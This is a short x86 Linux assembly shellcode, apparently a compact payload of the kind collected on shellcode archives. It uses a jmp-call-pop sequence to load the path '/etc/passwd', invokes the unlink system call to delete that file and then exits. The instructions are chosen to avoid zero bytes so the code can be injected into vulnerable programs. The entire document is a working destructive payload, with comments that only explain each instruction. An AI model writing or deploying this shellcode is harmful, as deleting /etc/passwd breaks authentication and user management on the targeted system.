global _start

section .text
_start:
    jmp short here

me:
    pop ebx          ; Directly pop the @ of /etc/passwd into ebx

    xor ecx,ecx
    mul ecx          ; This instruction will cause both EAX and EDX to become zero
    
    mov cl,0x1
    mov al,0xb
    sub al,cl        ; Equivalent to mov al,0xa
    int 0x80         ; int unlink(const char *pathname);
    
    mov al,cl        ; Equivalent to mov al,0x1
    int 0x80         ; void _exit(int status);
    call me

here:
    call me
    path db "/etc/passwd"